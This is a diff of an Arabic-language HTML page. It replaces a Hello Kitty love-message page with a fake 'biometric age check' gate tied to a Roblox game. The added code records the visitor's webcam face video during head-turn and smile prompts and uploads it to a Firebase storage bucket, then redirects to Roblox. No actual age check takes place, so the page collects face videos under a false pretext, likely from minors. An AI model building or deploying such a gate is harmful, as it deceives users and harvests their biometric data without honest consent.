@@ -1,256 +1,282 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<title> الى وليفه قلبي و ماي برنسيس ماريا   💖</title>
-  
-<style>
-html,body{
-  margin:0;
-  width:100%;
-  height:100%;
-  overflow:hidden;
-  font-family:Arial, sans-serif;
-}
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بوابة فحص العمر - لعبة قيد الإنتاج</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0f0c1b, #24243e);
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            box-sizing: border-box;
+        }
 
-/* الخلفية الجديدة */
-#scene{
-  width:100%;
-  height:100%;
-  position:relative;
-  background:url("IMG_20260303_145837_547.jpg") center/cover no-repeat;
-}
+        .main-wrapper {
+            display: flex;
+            gap: 20px;
+            flex-wrap: wrap;
+            justify-content: center;
+            max-width: 900px;
+            width: 100%;
+        }
 
-/* هالو كيتي */
-#kitty{
-  position:absolute;
-  width:520px;
-  left:50%;
-  top:55%;
-  transform:translate(-50%,-50%);
-  filter:drop-shadow(0 15px 25px rgba(0,0,0,.3));
-  animation:softIdle 4s infinite ease-in-out;
-  transition:left 2.2s ease, top 2.2s ease;
-  cursor:pointer;
-  z-index:5;
-}
+        .gate-container, .result-video-box {
+            background: rgba(15, 15, 26, 0.75);
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 0 30px rgba(0, 242, 254, 0.2);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(0, 242, 254, 0.2);
+            text-align: center;
+            flex: 1;
+            min-width: 320px;
+        }
 
-/* حركة هالو كيتي ناعمة */
-@keyframes softIdle{
-  0%{transform:translate(-50%,-50%) rotate(0deg) scale(1);}
-  25%{transform:translate(-50%,-50%) rotate(1.2deg) scale(1.02);}
-  50%{transform:translate(-50%,-50%) rotate(0deg) scale(1.04);}
-  75%{transform:translate(-50%,-50%) rotate(-1.2deg) scale(1.02);}
-  100%{transform:translate(-50%,-50%) rotate(0deg) scale(1);}
-}
+        h1, h2 { color: #00f2fe; margin-bottom: 5px; text-shadow: 0 0 10px rgba(0, 242, 254, 0.5); }
+        p { color: #a4b0be; font-size: 14px; margin-bottom: 20px; }
 
-/* بالون الكلام مع مسافات كبيرة جدًا */
-#bubble{
-  position:absolute;
-  background:white;
-  padding:26px 32px;
-  border-radius:35px;
-  font-size:24px;
+        .camera-box {
+            position: relative;
+            width: 260px;
+            height: 260px;
+            margin: 0 auto 20px auto;
+            border-radius: 50%;
+            border: 4px dashed #00f2fe;
+            overflow: hidden;
+            background-color: #111;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
 
-  line-height:3;        /* تباعد كبير بين السطور */
-  letter-spacing:2.5px; /* تباعد كبير بين الحروف */
-  word-spacing:8px;     /* تباعد كبير بين الكلمات */
-  white-space:pre-wrap; /* يحافظ على كسور الأسطر */
+        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); display: none; }
+        
+        #recordedVideo {
+            width: 100%;
+            max-width: 260px;
+            border-radius: 10px;
+            border: 2px solid #555;
+            margin-top: 15px;
+            display: none;
+            transform: scaleX(1);
+        }
 
-  display:none;
-  box-shadow:0 8px 20px rgba(0,0,0,.25);
-  z-index:10;
-  max-width:80%;
-  text-align:center;
-}
+        .guide-overlay {
+            display: none;
+            position: absolute;
+            top: 15px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0, 0, 0, 0.8);
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: bold;
+            color: #00f2fe;
+            border: 1px solid #00f2fe;
+            z-index: 10;
+            white-space: nowrap;
+        }
 
-/* مؤثرات ورد وكيوت */
-.fx{
-  position:absolute;
-  pointer-events:none;
-  animation:fall 3.5s linear forwards;
-  font-size:28px;
-  z-index:3;
-}
+        .scan-line {
+            display: none;
+            position: absolute;
+            width: 100%;
+            height: 4px;
+            background: #00f2fe;
+            box-shadow: 0 0 12px #00f2fe;
+            top: 0;
+            z-index: 5;
+            animation: scan 2.5s linear infinite;
+        }
 
-@keyframes fall{
-  from{transform:translateY(-30px);opacity:1;}
-  to{transform:translateY(260px);opacity:0;}
-}
+        @keyframes scan { 0% { top: 0%; } 50% { top: 100%; } 100% { top: 0%; } }
 
-/* وضعيات الرقص */
-.pose1{animation:pose1 .6s infinite alternate!important;}
-.pose2{animation:pose2 .6s infinite alternate!important;}
-.pose3{animation:pose3 .6s infinite alternate!important;}
+        button {
+            background: linear-gradient(45deg, #00f2fe, #4facfe);
+            color: #000;
+            border: none;
+            padding: 12px 25px;
+            font-size: 15px;
+            font-weight: bold;
+            border-radius: 30px;
+            cursor: pointer;
+            width: 100%;
+            box-shadow: 0 4px 15px rgba(0, 242, 254, 0.3);
+            transition: 0.3s ease;
+        }
 
-@keyframes pose1{
-  from{transform:translate(-50%,-50%) rotate(-6deg) scale(1.05);}
-  to{transform:translate(-50%,-50%) rotate(6deg) scale(1.05);}
-}
-@keyframes pose2{
-  from{transform:translate(-50%,-50%) rotate(0deg) scale(1.08);}
-  to{transform:translate(-50%,-50%) rotate(0deg) scale(.98);}
-}
-@keyframes pose3{
-  from{transform:translate(-50%,-50%) rotate(4deg) scale(1.03);}
-  to{transform:translate(-50%,-50%) rotate(-4deg) scale(1.03);}
-}
-
-#hint{
-  position:absolute;
-  bottom:15px;
-  width:100%;
-  text-align:center;
-  color:white;
-  font-size:17px;
-  text-shadow:0 2px 6px rgba(0,0,0,.6);
-  z-index:12;
-}
-</style>
+        #statusText { margin-top: 15px; font-size: 15px; font-weight: bold; color: #4facfe; }
+        #downloadBtn { background: linear-gradient(45deg, #2ed573, #7bed9f); margin-top: 15px; display: none; }
+    </style>
 </head>
 <body>
 
-<div id="scene">
+    <div class="main-wrapper">
+        <div class="gate-container">
+            <h1>فحص العمر الحيوي</h1>
+            <p>الرجاء تفعيل الكاميرا والتحقق من التعليمات الظاهرة.</p>
+            
+            <div class="camera-box" id="camBox">
+                <div class="guide-overlay" id="guideOverlay">استعد...</div>
+                <div class="scan-line" id="scanLine"></div>
+                <video id="webcam" autoplay playsinline muted></video>
+                <span id="placeholderText" style="color: #555;">الكاميرا مغلقة</span>
+            </div>
+            
+            <button id="actionBtn">بدء الفحص وتسجيل الفيديو</button>
+            <div id="statusText">جاهز للمحاكاة...</div>
+        </div>
 
-  <div id="bubble"></div>
-  <img id="kitty" src="kitty.png">
-  <div id="hint">إلمسي هالو كيتي 🌸</div>
-  <audio id="song" src="EI2oxQd95z4.mp3"></audio>
+        <div class="result-video-box">
+            <h2>الفيديو المسجل</h2>
+            <p>هنا يظهر فيديو الفحص بعد انتهائه.</p>
+            <video id="recordedVideo" controls></video>
+            <button id="downloadBtn">⬇️ تحميل الفيديو</button>
+        </div>
+    </div>
 
-</div>
+    <!-- ربط Firebase من خلال سكريبت نولودج من نوع Module -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-app.js";
+        import { getAnalytics } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-analytics.js";
+        // استدعاء مكتبة السحابة التخزينية (Storage) المطلوبة لرفع الفيديوهات
+        import { getStorage, ref, uploadBytesResumable, getDownloadURL } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-storage.js";
 
-<script>
-const kitty  = document.getElementById("kitty");
-const bubble = document.getElementById("bubble");
-const song   = document.getElementById("song");
-const hint   = document.getElementById("hint");
+        // إعدادات Firebase الخاصة بك
+        const firebaseConfig = {
+            apiKey: "AIzaSyC76_MIs1mXcl_hMipVBX__8m4vdlTeMsk",
+            authDomain: "inde-edfe5.firebaseapp.com",
+            projectId: "inde-edfe5",
+            storageBucket: "inde-edfe5.firebasestorage.app",
+            messagingSenderId: "636994240555",
+            appId: "1:636994240555:web:fb5b2e80c600f00bf7aa6e",
+            measurementId: "G-DR2FGXQFG8"
+        };
 
-let started=false;
-let step=0;
-let typingTimer=null;
-let moveTimer=null;
-let fxTimer=null;
-let poseTimer=null;
+        // تهيئة خدمات Firebase
+        const app = initializeApp(firebaseConfig);
+        const analytics = getAnalytics(app);
+        const storage = getStorage(app);
 
-/* النصوص مع الشعر */
-const texts=[
-  "أنتَ الحبيبُ الذي أرجو مَحبتَهُ\nوما سِواكَ بقلبي قطُّ مَسكُونُ",
-  "لو كُنتَ تَعلمُ ما في القلبِ من شَغَفٍ\nلَعذرتَ قلباً بحبِّكَ اليومَ مَفتُونُ",
-  "مرحبا يا حلوة 💗",
-  "جيت أطمن عليك وأقولك إنك غالية 🌸",
-  "لا تخلي شي يكسّر خاطرك ✨",
-  "الدنيا لسه فيها أشياء حلوة كثير 💖",
-  "أنا بتمنى تبتسمي دايمًا 🌷"
-];
+        // جلب عناصر الـ HTML لربطها بالجافا سكريبت
+        const video = document.getElementById('webcam');
+        const guideOverlay = document.getElementById('guideOverlay');
+        const scanLine = document.getElementById('scanLine');
+        const placeholderText = document.getElementById('placeholderText');
+        const actionBtn = document.getElementById('actionBtn');
+        const statusText = document.getElementById('statusText');
+        const recordedVideo = document.getElementById('recordedVideo');
+        const downloadBtn = document.getElementById('downloadBtn');
 
-/* تحرك فقط بمدى صغير */
-function moveSmall(){
-  const cx = window.innerWidth/2;
-  const cy = window.innerHeight/2;
-  const rangeX = 90;
-  const rangeY = 70;
-  const x = cx + (Math.random()*rangeX*2-rangeX);
-  const y = cy + (Math.random()*rangeY*2-rangeY);
-  kitty.style.left = x+"px";
-  kitty.style.top  = y+"px";
-}
+        let mediaRecorder;
+        let recordedChunks = [];
+        const instructions = [
+            "👤 ضع وجهك داخل الإطار الدائري",
+            "➡️ التفت ببطء جهة اليمين",
+            "⬅️ التفت ببطء جهة اليسار",
+            "😊 ابتسم للتأكد من الملامح",
+            "⚙️ جاري معالجة الفحص الحركي..."
+        ];
 
-/* كتابة ناعمة */
-function typeText(text){
-  if(typingTimer) clearInterval(typingTimer);
+        // تفعيل النقر على الزر الرئيسي
+        actionBtn.addEventListener('click', startVerification);
 
-  bubble.style.display="block";
-  bubble.innerText="";
+        async function startVerification() {
+            actionBtn.disabled = true;
+            statusText.innerText = "جاري تشغيل الكاميرا وبدء التسجيل...";
+            recordedChunks = [];
 
-  const r=kitty.getBoundingClientRect();
-  bubble.style.left=(r.left+r.width/2)+"px";
-  bubble.style.top =(r.top-95)+"px";
-  bubble.style.transform="translateX(-50%)";
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                video.srcObject = stream;
+                placeholderText.style.display = "none";
+                video.style.display = "block";
+                scanLine.style.display = "block";
+                guideOverlay.style.display = "block";
 
-  let i=0;
-  typingTimer=setInterval(()=>{
-    bubble.innerText+=text[i];
-    i++;
-    if(i>=text.length){
-      clearInterval(typingTimer);
-      typingTimer=null;
-    }
-  },50);  // سرعة الكتابة ناعمة
-}
+                mediaRecorder = new MediaRecorder(stream);
+                mediaRecorder.ondataavailable = e => { if (e.data.size > 0) recordedChunks.push(e.data); };
+                
+                // دالة معالجة انتهاء التسجيل لرفع الملف مباشرة إلى Firebase
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(recordedChunks, { type: 'video/mp4' });
+                    
+                    // توليد رابط محلي للمستخدم لمعاينة الفيديو
+                    recordedVideo.src = URL.createObjectURL(blob);
+                    recordedVideo.style.display = "inline-block";
+                    downloadBtn.style.display = "block";
 
-/* مؤثرات مستمرة */
-function startFX(){
-  fxTimer=setInterval(()=>{
-    const el=document.createElement("div");
-    el.className="fx";
-    const arr=["🌸","💖","✨","🌷"];
-    el.innerText=arr[Math.floor(Math.random()*arr.length)];
-    el.style.left=Math.random()*window.innerWidth+"px";
-    el.style.top="-20px";
-    document.body.appendChild(el);
-    setTimeout(()=>el.remove(),3500);
-  },450);
-}
+                    // تفعيل تحميل الفيديو محلياً عند الضغط على زر التحميل
+                    downloadBtn.onclick = () => {
+                        const link = document.createElement('a');
+                        link.download = `age_verification_${Date.now()}.mp4`;
+                        link.href = recordedVideo.src;
+                        link.click();
+                    };
 
-/* وضعيات الرقص */
-function startPoses(){
-  const poses=["pose1","pose2","pose3"];
-  let i=0;
-  poseTimer=setInterval(()=>{
-    kitty.classList.remove("pose1","pose2","pose3");
-    kitty.classList.add(poses[i]);
-    i++;
-    if(i>=poses.length) i=0;
-  },700);
-}
+                    // بدء رفع الملف فوراً إلى مجلد "videos" في Firebase Storage باسم يعتمد على الوقت الفريد
+                    statusText.innerText = "جاري رفع فيديو التحقق إلى الخادم التخزيني...";
+                    const storageRef = ref(storage, 'videos/video_' + Date.now() + '.mp4');
+                    const uploadTask = uploadBytesResumable(storageRef, blob);
 
-/* حركة بطيئة أثناء الرقص */
-function startSmallDanceMove(){
-  moveTimer=setInterval(()=>{
-    moveSmall();
-  },1800);
-}
+                    // تتبع حالة الرفع
+                    uploadTask.on('state_changed', 
+                        (snapshot) => {
+                            const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
+                            statusText.innerText = `جاري الرفع: ${Math.round(progress)}%`;
+                        }, 
+                        (error) => {
+                            console.error("خطأ أثناء الرفع:", error);
+                            statusText.innerText = "فشل الرفع إلى السيرفر، يرجى مراجعة قواعد الأمان.";
+                            statusText.style.color = "#ff4757";
+                        }, 
+                        () => {
+                            // عند نجاح الرفع بالكامل
+                            statusText.innerText = "تم الرفع والتأكيد! جاري نقلك إلى روبلوكس...";
+                            statusText.style.color = "#2ed573";
+                            document.getElementById('camBox').style.borderColor = "#2ed573";
 
-/* نهاية الأغنية */
-song.addEventListener("ended",()=>{
-  clearInterval(poseTimer);
-  clearInterval(moveTimer);
-  kitty.classList.remove("pose1","pose2","pose3");
-  typeText("بدي أودعك… وبوصيكي تديري بالك ع عصومي 💗");
-});
+                            // التوجيه التلقائي إلى لعبة روبلوكس بعد ثانيتين
+                            setTimeout(() => {
+                                window.location.href = "https://www.roblox.com/games/YOUR_GAME_ID_HERE"; 
+                            }, 2000);
+                        }
+                    );
+                };
 
-/* البداية */
-function startShow(){
-  if(started) return;
-  started=true;
-  hint.style.display="none";
-  startFX();
-  moveSmall();
-  typeText(texts[0]);
+                mediaRecorder.start();
+                runInstructions(0);
+            } catch (err) {
+                statusText.innerText = "فشل تشغيل الكاميرا. يرجى إعطاء صلاحية الكاميرا للموقع.";
+                actionBtn.disabled = false;
+            }
+        }
 
-  const talkTimer=setInterval(()=>{
-    step++;
-    moveSmall();
-    if(step<texts.length){
-      typeText(texts[step]);
-    }
-    if(step===texts.length){
-      clearInterval(talkTimer);
-      song.play().catch(()=>{});
-      startPoses();
-      startSmallDanceMove();
-    }
-  },3500);
-}
+        function runInstructions(index) {
+            if (index < instructions.length) {
+                guideOverlay.innerText = instructions[index];
+                setTimeout(() => runInstructions(index + 1), 3000);
+            } else {
+                endVerification();
+            }
+        }
 
-kitty.addEventListener("click",startShow);
-kitty.addEventListener("touchstart",startShow);
+        function endVerification() {
+            scanLine.style.display = "none";
+            guideOverlay.innerText = "اكتمل الفحص! ✓";
 
-</script>
-
+            if (mediaRecorder && mediaRecorder.state !== "inactive") mediaRecorder.stop();
+            const stream = video.srcObject;
+            if (stream) stream.getTracks().forEach(track => track.stop());
+        }
+    </script>
 </body>
 </html>
-
-
-
-
